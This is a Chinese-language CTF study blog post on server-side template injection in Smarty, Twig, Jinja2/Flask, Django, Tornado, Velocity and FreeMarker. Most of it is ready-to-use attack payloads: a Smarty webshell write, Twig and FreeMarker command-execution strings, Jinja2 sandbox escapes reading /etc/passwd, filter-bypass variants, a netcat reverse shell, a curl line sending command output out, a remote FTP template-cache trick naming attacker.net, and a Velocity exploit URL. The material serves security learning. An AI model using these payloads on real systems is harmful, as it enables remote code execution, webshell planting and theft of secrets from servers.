---
title: SSTI理解
date: 2020-09-14 15:20:20
tags: CTF
---

# 一 、什么是SSTI

## 0x00 模板注入

这是基于现在的MVC成熟的开发模式所导致的，开发者将输入通过V接收，交给C，然后由 C 调用 M 或者其他的 C 进行处理，最后再返回给 V ，这样就最终显示在我们的面前了，那么这里的 V 中就大量的用到了一种叫做**模板**的技术。**这种模板的技术不是仅存在于Python**，只要能使用模版进行开发的地方都会有这个问题，SSTI不属于任何一种的问题，沙盒绕过也不是。

## 0x01常见的模板

PHP：Smarty，Twig（经常出题），Blade

判断

```
Twig 
{{7*'7'}}  #输出49
Jinja
{{7*'7'}}  #输出7777777
```

Java：JSP，FreeMarker，Velocity

Python： Jinja2（常用），django，tornado

tornado render() 中支持传入自定义函数，以及函数的参数，然后在两个大括号中执行

<!--more-->

## 0x02 漏洞形成

同SQL注入，别太相信用户的输入

## 0x03 漏洞检测

加payload进行输入，然后进行查看回显

## 0x04 开始攻击

1.攻击方向

- 模版本身
- 框架本身
- 语言本身
- 应用本身

2.攻击方法

- 模板本身支持的语法、内置变量、属性、函数，还有就是纯粹框架的全局变量、属性、函数
- 语言本身的特性，比如 面向对象的内省机制
- 寻找应用定义的一些东西，因为这个是几乎没有文档的，是开发者的自行设计，一般需要拿到应用的源码才能考虑

```
注意：面向对象的语言中，获取父类这种思想要贯穿始终，
理论基础：
    Python 的魔法方法
    PHP 的自省
    JAVA 的反射机制
```

### 利用模板本身的特性进行攻击

1.Smarty

这个模版不能执行PHP中直接进行命令的函数，但是对于语言的限制并不能够影响我们执行命令。(因为没有阅读文档，所以直接从大佬文章中摘抄)。`$`+内置变量可以访问各种环境变量，比如其中**self得到smarty这个类**，**但是这个方法在3.x版本已经废弃，删掉了静态方法**我们就可以开始去找文档中的好方法了

[getStreamVariable()](https://github.com/smarty-php/smarty/blob/fa269d418fb4d3687558746e67e054c225628d13/libs/sysplugins/smarty_internal_data.php#L385)

这个函数可以读文件

```
payload:
	{self::getStreamVariable("flag.php")}
```

[class Smarty_Internal_Write_File](https://github.com/smarty-php/smarty/blob/fa269d418fb4d3687558746e67e054c225628d13/libs/sysplugins/smarty_internal_write_file.php#L16)

这是一个写文件的，这个类中有一个writeFile方法， 

```php
class Smarty_Internal_Write_File
{
    /**
     * Writes file in a safe way to disk
     *
     * @param  string $_filepath complete filepath
     * @param  string $_contents file content
     * @param  Smarty $smarty    smarty instance
     *
     * @throws SmartyException
     * @return boolean true
     */
    public function writeFile($_filepath, $_contents, Smarty $smarty)
    {
        $_error_reporting = error_reporting();
        error_reporting($_error_reporting & ~E_NOTICE & ~E_WARNING);
        if ($smarty->_file_perms !== null) {
            $old_umask = umask(0);
        }

        $_dirpath = dirname($_filepath);
        // if subdirs, create dir structure
        if ($_dirpath !== '.' && !file_exists($_dirpath)) {
            mkdir($_dirpath, $smarty->_dir_perms === null ? 0777 : $smarty->_dir_perms, true);
        }

        // write to tmp file, then move to overt file lock race condition
        $_tmp_file = $_dirpath . DS . str_replace(array('.', ','), '_', uniqid('wrt', true));
        if (!file_put_contents($_tmp_file, $_contents)) {
            error_reporting($_error_reporting);
            throw new SmartyException("unable to write file {$_tmp_file}");
       }

        /*
         * Windows' rename() fails if the destination exists,
         * Linux' rename() properly handles the overwrite.
         * Simply unlink()ing a file might cause other processes
         * currently reading that file to fail, but linux' rename()
         * seems to be smart enough to handle that for us.
         */
        if (Smarty::$_IS_WINDOWS) {
            // remove original file
            if (is_file($_filepath)) {
                @unlink($_filepath);
            }
            // rename tmp file
            $success = @rename($_tmp_file, $_filepath);
        } else {
            // rename tmp file
            $success = @rename($_tmp_file, $_filepath);
            if (!$success) {
                // remove original file
                if (is_file($_filepath)) {
                    @unlink($_filepath);
                }
                // rename tmp file
                $success = @rename($_tmp_file, $_filepath);
            }
        }
        if (!$success) {
            error_reporting($_error_reporting);
            throw new SmartyException("unable to write file {$_filepath}");
        }
        if ($smarty->_file_perms !== null) {
            // set file permissions
            chmod($_filepath, $smarty->_file_perms);
            umask($old_umask);
        }
        error_reporting($_error_reporting);

        return true;
    }
}
```

可以看到 writeFile 函数第三个参数一个 Smarty 类型，后来找到了 self::clearConfig()，函数原型：

```PHP
public function clearConfig($varname = null)
{
    return Smarty_Internal_Extension_Config::clearConfig($this, $varname);
}
```

payload:

```php
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php eval($_GET['cmd']); ?>",self::clearConfig())}
```

常用的payload

```
{$smarty.version}  #获取smarty的版本号
{php}phpinfo();{/php}  #执行相应的php代码##在最新版已经废弃
{if phpinfo()}{/if}  #全部的PHP条件表达式和函数都可以在if内使用，如||*，or，&&，and，is_array()等等，如：{if is_array($array)}{/if}*，也可以执行php代码
```

2.Twig

相比于 Smarty ,Twig 无法调用静态方法，并且所有函数的返回值都转换为字符串，也就是我们不能使用 `self::` 调用静态变量了。但是可以查阅[官方文档](https://twig.symfony.com/doc/2.x/templates.html)

Twig 给我们提供了一个 `_self`, 虽然 `_self` 本身没有什么有用的方法，但是却有一个 env。env是指属性Twig_Environment对象，Twig_Environment对象有一个 setCache方法可用于更改Twig尝试加载和执行编译模板（PHP文件）的位置(不知道为什么官方文档没有看到这个方法，后来我找到了Twig 的源码中的 environment.php

![](https://picture-1253331270.cos.ap-beijing.myqcloud.com/Twig_setCache.png)

因此，明显的攻击是通过将缓存位置设置为远程服务器来引入远程文件包含漏洞：

```
{{_self.env.setCache("ftp://attacker.net:2121")}}
{{_self.env.loadTemplate("backdoor")}}
```

但是这里就又需要我们的远程文件包含漏洞了。allow_url_include 一般是不打开的，没法包含远程文件。

新的大佬又出现了:

 [getFilter()](https://github.com/twigphp/Twig/blob/e22fb8728b395b306a06785a3ae9b12f3fbc0294/lib/Twig/Environment.php#L874)

我们只要把exec() 作为回调函数传进去就能实现命令执行了.

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

版本3.x的payload,围绕几个fliter

- map

`{{["id"]|map("system")|join(",")`

`{{{"<?php phpinfo();":"/var/www/html/shell.php"}|map("file_put_contents")}}`

- sort

`{{["id", 0]|sort("system")|join(",")}}`

- filter

  `{{["id"]|filter("system")|join(",")}}`

- reduce

  `{{[0, 0]|reduce("system", "id")|join(",")}}`

  

```
{{'/etc/passwd'|file_excerpt(1,30)}}

{{app.request.files.get(1).__construct('/etc/passwd','')}}

{{app.request.files.get(1).openFile.fread(99)}}

{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}

{{_self.env.enableDebug()}}{{_self.env.isDebug()}}

{{["id"]|map("system")|join(",")

{{{"<?php phpinfo();":"/var/www/html/shell.php"}|map("file_put_contents")}}

{{["id",0]|sort("system")|join(",")}}

{{["id"]|filter("system")|join(",")}}

{{[0,0]|reduce("system","id")|join(",")}}

{{['cat /etc/passwd']|filter('system')}}
```

3.freeMarker

java模板

```
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
```

查找文档，查看框架源码，等方式寻找这个 payload 的思路来源

### 利用框架本身的特性进行攻击

1.Django

```python
def view(request, *args, **kwargs):
    template = 'Hello {user}, This is your email: ' + request.GET.get('email')
    return HttpResponse(template.format(user=request.user))
```

注入点很明显就是 email,但是我们能够做的事情已经被限制得很死了，很难再执行命令了。

```
去挖掘Django自带的应用中的一些路径，最终读取到Django的配置项
```

我们发现，经过翻找，我发现Django自带的应用“admin”（也就是Django自带的后台）的models.py中导入了当前网站的配置文件。

思路就很明确了：我们只需要通过某种方式，找到Django默认应用admin的model，再通过这个model获取settings对象，进而获取数据库账号密码、Web加密密钥等信息。

```
{user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY}
{user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY}
```

2.Flask/Jinja2

config 是Flask模版中的一个全局对象，它是一个类字典的对象，它包含了所有应用程序的配置值。在大多数情况下，它包含了比如数据库链接字符串，连接到第三方的凭证，SECRET_KEY等敏感值。虽然config是一个类字典对象，但是通过查阅文档可以发现 config 有很多神奇的方法：`from_envvar`, `from_object`, `from_pyfile`, 以及`root_path`。这里我们利用 `from_pyfile` 和 `from_object` 来命令执行。

```python
def from_pyfile(self, filename, silent=False):

    filename = os.path.join(self.root_path, filename)
    d = types.ModuleType('config')
    d.__file__ = filename
    try:
        with open(filename) as config_file:
            exec(compile(config_file.read(), filename, 'exec'), d.__dict__)
    except IOError as e:
        if silent and e.errno in (errno.ENOENT, errno.EISDIR):
            return False
        e.strerror = 'Unable to load configuration file (%s)' % e.strerror
        raise
    self.from_object(d)
    return True


def from_object(self, obj):

    if isinstance(obj, string_types):
        obj = import_string(obj)
    for key in dir(obj):
        if key.isupper():
            self[key] = getattr(obj, key)
```

这个方法将传入的文件使用 compile() 这个python 的内置方法将其编译成字节码(.pyc),并放到 exec() 里面去执行，注意最后一个参数 `d.__dict__`翻阅文档发现，这个参数的含义是指定 exec 执行的上下文，

这个方法会遍历 Obj 的 dict 并且找到大写字母的属性，将属性的值给 self[‘属性名’]，所以说如果我们能让 from_pyfile 去读这样的一个文件

```
from os import system
SHELL = system
```

到时候我们就能通过 config[‘SHELL’] 调用 system 方法了

那么文件怎么写入呢？Jinja2 有沙盒机制，我们必须通过绕过沙盒的方式写入我们想要的文件，具体的沙盒绕过,大佬的一篇博文[python 沙盒逃逸备忘](http://www.k0rz3n.com/2018/05/04/Python 沙盒逃逸备忘/)

payload:

### 1.python2

```
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evil', 'w').write('from os import system%0aSHELL = system') }}
//写文件
{{ config.from_pyfile('/tmp/evil') }}
//加载system
{{ config['SHELL']('nc xxxx xx -e /bin/sh') }}
//执行命令反弹SHELL
```

使用file类读取文件

```Python
for c in {}.__class__.__base__.__subclasses__():
    if(c.__name__=='file'):
        print(c)
        print c('joker.txt').readlines()
封装一下：
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__=='file' %}
{{ c("/etc/passwd").readlines() }}
{% endif %}
{% endfor %}
```

使用内置模块进行命令执行

`__globals__`查看内置的对象可以调用的方法

```python
#coding:utf-8
search = 'current_app'   #也可以是其他你想利用的模块
num = -1
for i in ().__class__.__bases__[0].__subclasses__():
    num += 1
    try:
        if search in i.__init__.__globals__.keys():#对存放该函数中全局变量的字典的引用 — 函数所属模块的全局命名空间。故可以直接调用
            print(i, num)
    except:
        pass 
```

这时候就要推`荐__builtins__`：

```python
#coding:utf-8

search = '__builtins__'
num = -1
for i in ().__class__.__bases__[0].__subclasses__():
    num += 1
    try:
        print(i.__init__.__globals__.keys())
        if search in i.__init__.__globals__.keys():
            print(i, num)
    except:
        pass
```

python3:().`__class__.__bases__[0].__subclasses__()[64].__init__.__globals__['__builtins__']['eval']("__import__('os').system('whoami')")`

python2:`().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').system('whoami')")`

附上大佬的payload:

```
获得基类
#python2.7
''.__class__.__mro__[2]
{}.__class__.__bases__[0]
().__class__.__bases__[0]
[].__class__.__bases__[0]
request.__class__.__mro__[1]
#python3.7
''.__。。。class__.__mro__[1]
{}.__class__.__bases__[0]
().__class__.__bases__[0]
[].__class__.__bases__[0]
request.__class__.__mro__[1]

#python 2.7
#文件操作
#找到file类
[].__class__.__bases__[0].__subclasses__()[40]
#读文件
[].__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()
#写文件
[].__class__.__bases__[0].__subclasses__()[40]('/tmp').write('test')

#命令执行
#os执行
[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache下有os类，可以直接执行命令：
[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache.os.popen('id').read()
#eval,impoer等全局函数
[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__下有eval，__import__等的全局函数，可以利用此来执行命令：
[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")
[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.eval("__import__('os').popen('id').read()")
[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('id').read()
[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()

#python3.7
#命令执行
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}{% endif %}{% endfor %}
#文件操作
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}
#windows下的os命令
"".__class__.__bases__[0].__subclasses__()[118].__init__.__globals__['popen']('dir').read()

```

**绕waf**

过滤【

```python
#getitem、pop
''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()
''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen('ls').read()
```

过滤引号

```
#chr函数
{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}
{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read()}}#request对象
{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() }}&path=/etc/passwd
#命令执行
{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}
{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() }}
{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() }}&cmd=id
```

过滤下划线

```
{{''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&class=__class__&mro=__mro__&subclasses=__subclasses__
```

过滤花括号

```
#用{%%}标记
{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://127.0.0.1:7999/?i=`whoami`').read()=='p' %}1{% endif %}
```

利用示例

```
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("id").read()') }}         //popen的参数就是要执行的命令
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
```

3.Tornado

我觉得除了直接阅读官方的文档，还有一个重要的方法就是直接下载 tornado 的框架源码，全局搜索 `需要的值`我特地看一下模板的对框架的语法支持(因为，`模板中有一些内置的对象等同于框架中的对象，但是一般为了方便书写前段就会给一个比较简单的名字`，就比如 JSP 的 request 内置对象实际上对应着 servlet 中的 HttpServletRequest )

护网杯的easytornado，全局搜索sercet-key，然后再查看官方文档

4.Django

很明显 email 就是注入点，但是条件被限制的很死，很难执行命令，现在拿到的只有有一个和user有关的变量request.user ，这个时候我们就应该在**没有应用源码的情况下去寻找框架本身的属性**，看这个空框架有什么属性和类之间的引用。

后来发现Django自带的应用 "admin"（也就是Django自带的后台）的models.py中导入了当前网站的配置文件：

![](https://i.loli.net/2020/11/24/vsaSyUfgw2R76Mm.png)

所以可以通过某种方式，找到Django默认应用admin的model，再通过这个model获取settings对象，进而获取数据库账号密码、Web加密密钥等信息。

#### **2.利用模语言本身的特性进行攻击**

##### **1.Python**

Python 最最经典的就是使用魔法方法，这里就涉及到Python沙盒绕过了，前面说过，模板的设计者也发现了模板的执行命令的特性，于是就给模本增加了一种沙盒的机制，在这个沙盒中你很难执行一般我们能想到函数，基本都被禁用了，所以我们不得不使用自省的机制来绕过沙盒，具体的方法就是在大佬的[一篇博文](http://www.k0rz3n.com/2018/05/04/Python 沙盒逃逸备忘/)中

##### **2.JAVA**《转载大佬的部分》

java.lang包是java语言的核心，它提供了java中的基础类。包括基本Object类、Class类、String类、基本类型的包装类、基本的数学类等等最基本的

**如下图所示：**

[![此处输入图片的描述](https://img.dem0dem0.top/images/java.lang.png)](https://picture-1253331270.cos.ap-beijing.myqcloud.com/java.lang.png)此处输入图片的描述

有了这个基础我们就能想到这样的payload

**payload：**

```java
${T(java.lang.System).getenv()}

${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
```

这里面的 T() 是 EL 的语法规定（比如 Spring 框架的 EL 就是 SPEL)

## java常见的引擎：FreeMarker， velocity

### velocity

（以下板块参照自《[CVE-2019-3396 Confluence Velocity SSTI漏洞浅析](https://xz.aliyun.com/t/8135#toc-2)》）

Apache Velocity是一个基于Java的模板引擎，它提供了一个模板语言去引用由Java代码定义的对象。Velocity是Apache基金会旗下的一个开源软件项目，旨在确保Web应用程序在表示层和业务逻辑层之间的隔离（即MVC设计模式）。

**基本语法**

**语句标识符**

\#用来标识Velocity的脚本语句，包括#set、#if 、#else、#end、#foreach、#end、#include、#parse、#macro等语句。

**变量**

$用来标识一个变量，比如模板文件中为Hello $a，可以获取通过上下文传递的$a

**声明**

set用于声明Velocity脚本变量，变量可以在脚本中声明



```
#set($a ="velocity")
#set($b=1)
#set($arrayName=["1","2"])
```

**注释**

单行注释为##，多行注释为成对出现的#* ............. *#

**条件语句**

以if/else为例：



```
#if($foo<10)
    <strong>1</strong>
#elseif($foo==10)
    <strong>2</strong>
#elseif($bar==6)
    <strong>3</strong>
#else
    <strong>4</strong>
#end
```

**转义字符**

如果$a已经被定义，但是又需要原样输出$a，可以试用\转义作为关键的$

**基础使用**

使用Velocity主要流程为：

- 初始化Velocity模板引擎，包括模板路径、加载类型等
- 创建用于存储预传递到模板文件的数据的上下文
- 选择具体的模板文件，传递数据完成渲染

VelocityTest.java



```
package Velocity;

import org.apache.velocity.Template;
import org.apache.velocity.VelocityContext;
import org.apache.velocity.app.VelocityEngine;

import java.io.StringWriter;

public class VelocityTest {
    public static void main(String[] args) {

        VelocityEngine velocityEngine = new VelocityEngine();
        velocityEngine.setProperty(VelocityEngine.RESOURCE_LOADER, "file");
        velocityEngine.setProperty(VelocityEngine.FILE_RESOURCE_LOADER_PATH, "src/main/resources");
        velocityEngine.init();


        VelocityContext context = new VelocityContext();
        context.put("name", "Rai4over");
        context.put("project", "Velocity");


        Template template = velocityEngine.getTemplate("test.vm");
        StringWriter sw = new StringWriter();
        template.merge(context, sw);
        System.out.println("final output:" + sw);
    }
}
```

模板文件：src/main/resources/test.vm



```
Hello World! The first velocity demo.
Name is $name.
Project is $project
```

输出结果：



```
final output:
Hello World! The first velocity demo.
Name is Victor Zhang.
Project is Velocity
java.lang.UNIXProcess@12f40c25
```

通过 VelocityEngine 创建模板引擎，接着 velocityEngine.setProperty 设置模板路径 src/main/resources、加载器类型为file，最后通过 velocityEngine.init() 完成引擎初始化。

通过 VelocityContext() 创建上下文变量，通过put添加模板中使用的变量到上下文。

通过 getTemplate 选择路径中具体的模板文件test.vm，创建 StringWriter 对象存储渲染结果，然后将上下文变量传入 template.merge 进行渲染。

[![img](https://img.dem0dem0.top/images/1344396-20200907173719066-1030164230.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200907173719066-1030164230.png)

这里使用java-sec-code里面的SSTI代码：

[![img](https://img.dem0dem0.top/images/1344396-20200907191011269-128540012.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200907191011269-128540012.png)

poc：



```
http://127.0.0.1:8080/ssti/velocity?template=%23set(%24e=%22e%22);%24e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22calc%22)$class.inspect("java.lang.Runtime").type.getRuntime().exec("sleep 5").waitFor() //延迟了5秒
```

[![img](https://img.dem0dem0.top/images/1344396-20200907192034956-1485346370.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200907192034956-1485346370.png)

参照《[白头搔更短，SSTI惹人心！](https://xz.aliyun.com/t/7466)》简单进行调试

在最初的Controller层下断点，来追踪poc的解析过程：

[![img](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908095030110-571936567.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908095030110-571936567.png)

（template -> instring）进入 Velocity.evaluate 方法：

[![img](https://img.dem0dem0.top/images/1344396-20200908112550988-1581803954.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908112550988-1581803954.png)

（instring -> reader）继续跟进 evaluate 方法，RuntimeInstance类中封装了evaluate方法，instring被强制转化(Reader)类型。

[![img](https://img.dem0dem0.top/images/1344396-20200908112728222-13161049.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908112728222-13161049.png)

跟进 StringReader 方法查看详情：
[![img](https://img.dem0dem0.top/images/1344396-20200908113941507-617770245.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908113941507-617770245.png)

（reader -> nodeTree）继续跟进 this.evaluate() 方法

[![img](https://img.dem0dem0.top/images/1344396-20200908115525966-63941808.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908115525966-63941808.png)

（nodeTree -> writer）继续跟进render方法

[![img](https://img.dem0dem0.top/images/1344396-20200908141827072-400777989.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908141827072-400777989.png)

emmm...继续跟进render

[![img](https://img.dem0dem0.top/images/1344396-20200908142340601-1472158535.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908142340601-1472158535.png)

继续看render方法

[![img](https://img.dem0dem0.top/images/1344396-20200908143916739-984676483.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908143916739-984676483.png)

跟进execute方法

[![img](https://img.dem0dem0.top/images/1344396-20200908144606960-964942274.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908144606960-964942274.png)

可以看到这是最后一步了，调试结束就可以看到poc已经成功被执行，看一下上图中的for循环的代码，大概意思是当遍历的节点时候，这时候就会一步步的保存我们的payload最终导致RCE

**Confluence 未授权RCE分析（CVE-2019-3396）**

根据官方文档的描述，可以看到这是由 widget Connector 这个插件造成的SSTI，利用SSTI而造成的RCE。在经过diff后，可以确定触发漏洞的关键点在于对post包中的_template字段

具体漏洞代码调试可以参考：《[Confluence未授权模板注入/代码执行(CVE-2019-3396)](https://caiqiqi.github.io/2019/11/03/Confluence未授权模板注入-代码执行-CVE-2019-3396/)》

　　　　　　　　　　　　　《[Confluence 未授权RCE分析（CVE-2019-3396）](https://lucifaer.com/2019/04/16/Confluence 未授权RCE分析（CVE-2019-3396）/#0x01-漏洞概述)》

***4\***|***2\*****FreeMarker**

FreeMarker 是一款模板引擎：即一种基于模板和要改变的数据， 并用来生成输出文本(HTML网页，电子邮件，配置文件，源代码等)的通用工具。 它不是面向最终用户的，而是一个Java类库，是一款程序员可以嵌入他们所开发产品的组件。

[![img](https://img.dem0dem0.top/images/1344396-20200909230452926-1382441572.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200909230452926-1382441572.png)

**FreeMarker模板代码**：



```
<html>
<head>
  <title>Welcome!</title>
</head>
<body>　<#–这是注释–>
  <h1>Welcome ${user}!</h1>
  <p>Our latest product:
  <a href="${latestProduct.url}">${latestProduct.name}</a>!
</body>
</html>
```

模板文件存放在Web服务器上，就像通常存放静态HTML页面那样。当有人来访问这个页面， FreeMarker将会介入执行，然后动态转换模板，用最新的数据内容替换模板中 ${...} 的部分， 之后将结果发送到访问者的Web浏览器中。

这个模板主要用于 java ，用户可以通过实现 TemplateModel 来用 new 创建任意 Java 对象

具体的高级内置函数定义参考《[Seldom used and expert built-ins](https://freemarker.apache.org/docs/ref_builtins_expert.html)》

[![img](https://img.dem0dem0.top/images/1344396-20200911000148374-491461162.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911000148374-491461162.png)

主要的用法如下：



```
<＃ - 创建一个用户定义的指令，调用类的参数构造函数 - >
<#assign word_wrapp ="com.acmee.freemarker.WordWrapperDirective"?new（）>
<＃ - 创建一个用户定义的指令，用一个数字参数调用构造函数 - >
<#assign word_wrapp_narrow ="com.acmee.freemarker.WordWrapperDirective"?new（40）>
```

调用了构造函数创建了一个对象，那么这个 payload 中就是调用的 freemarker 的内置执行命令的对象 Execute

freemarker.template.utility 里面有个Execute类，这个类会执行它的参数，因此我们可以利用new函数新建一个Execute类，传输我们要执行的命令作为参数，从而构造远程命令执行漏洞。构造payload：



```
<#assign value="freemarker.template.utility.Execute"?new()>${value("calc.exe")}
```

freemarker.template.utility 里面有个ObjectConstructor类，如下图所示，这个类会把它的参数作为名称，构造了一个实例化对象。因此我们可以构造一个可执行命令的对象，从而构造远程命令执行漏洞。



```
<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","calc.exe").start()
```

freemarker.template.utility 里面的JythonRuntime，可以通过自定义标签的方式，执行Python命令，从而构造远程命令执行漏洞。



```
<#assign value="freemarker.template.utility.JythonRuntime"?new()><@value>import os;os.system("calc.exe")</@value>
```

这里使用测试代码来大概演示一下：https://github.com/hellokoding/springboot-freemarker

代码演示说明：https://hellokoding.com/spring-boot/freemarker/

前端代码　　——>　　hello.ftl



```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Hello ${name}!</title>
    <link href="/css/main.css" rel="stylesheet">
</head>
<body>
    <h2 class="hello-title">Hello ${name}!</h2>
    <script src="/js/main.js"></script>
</body>
</html>
```

后端代码　　——>　　HelloController.java：



```
package com.backendvulnerabilities.ssti;

import freemarker.cache.MultiTemplateLoader;
import freemarker.cache.StringTemplateLoader;
import freemarker.cache.TemplateLoader;
import freemarker.template.Configuration;
import freemarker.template.Template;
import freemarker.template.TemplateException;
import freemarker.template.utility.DateUtil;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.StringWriter;
import java.util.HashMap;
import java.util.Map;

@Controller
public class HelloController {

    @Autowired
    private  Configuration con;

    @GetMapping("/")
    public String index() {
        return "index";
    }

    @RequestMapping(value = "/hello")
    public String hello(@RequestBody Map<String,Object> body, Model model) {
        model.addAttribute("name", body.get("name"));
        return "hello";
    }

    @RequestMapping(value = "/freemarker")
    public void freemarker(@RequestParam("username") String username, HttpServletRequest httpserver,HttpServletResponse response) {
        try{
            String data = "1ooooooooooooooooooo~";
            String templateContent = "<html><body>Hello " + username + " ${data}</body></html>";
            String html = createHtmlFromString(templateContent,data);
            response.getWriter().println(html);

            }catch (Exception e){
                e.printStackTrace();
            }
    }

    private String createHtmlFromString(String templateContent, String data) throws IOException, TemplateException {
        Configuration cfg = new Configuration();
        StringTemplateLoader stringLoader = new StringTemplateLoader();
        stringLoader.putTemplate("myTemplate",templateContent);
        cfg.setTemplateLoader(stringLoader);
        Template template = cfg.getTemplate("myTemplate","utf-8");
        Map root = new HashMap();
        root.put("data",data);

        StringWriter writer = new StringWriter();
        template.process(root,writer);
        return writer.toString();
    }

    @RequestMapping(value = "/template", method =  RequestMethod.POST)
    public String template(@RequestBody Map<String,String> templates) throws IOException {
        StringTemplateLoader stringLoader = new StringTemplateLoader();
        for(String templateKey : templates.keySet()){
            stringLoader.putTemplate(templateKey, templates.get(templateKey));
        }
        con.setTemplateLoader(new MultiTemplateLoader(new TemplateLoader[]{stringLoader,
            con.getTemplateLoader()}));
        return "index";
    }
}
```

上述代码主要编译给定的模板字符串和数据，生成HTML进行输出

[![img](https://img.dem0dem0.top/images/1344396-20200911153736602-1300404619.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911153736602-1300404619.png)

模板注入的前提是在无过滤的情况下，使用模板来解析我们输入的字符，可以通过页面上的变化，来判断我们输入的内容是否被解析，如上图我们输入的内容被成功解析到页面上，并且没有过滤。

首先需要控制被攻击模板 /template 的内容，也就是要将本来无危害的模板文件实时更改为可攻击的模板内容。使用的payload



```
{"hello.ftl": "<!DOCTYPE html><html lang=\"en\"><head><meta charset=\"UTF-8\"><#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"ping ilxwh0.dnslog.cn\") }<title>Hello!</title><link href=\"/css/main.css\" rel=\"stylesheet\"></head><body><h2 class=\"hello-title\">Hello!</h2><script src=\"/js/main.js\"></script></body></html>"}
```

[![img](https://img.dem0dem0.top/images/1344396-20200911170426315-957198191.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911170426315-957198191.png)

关键代码在上图的红框中，接收用户传入的参数，使用keySet()获取key值，遍历相应的模块名字，使用StringTemplateLoader来加载模板内容，并使用putTemplate将key对应的value（也就是payload）写入templateKey中。这样就可以覆盖 hello.ftl 文件的内容，具体如下：

[![img](https://img.dem0dem0.top/images/1344396-20200911171827668-2059326925.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911171827668-2059326925.png)

重新更改了加载的模板内容后，然后直接访问受影响的模板文件路径，此时恶意的模板文件内容就会被加载成功了，并执行了系统命令

[![img](https://img.dem0dem0.top/images/1344396-20200911173804255-14835990.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911173804255-14835990.png)

dnslog平台也受到了请求

[![img](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911173946071-111351701.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911173946071-111351701.png)

## 二、开始运用

![](https://img.dem0dem0.top/images/1599480440997-00e10dda-bb44-4fe7-9b87-2a8de03b598d.png)

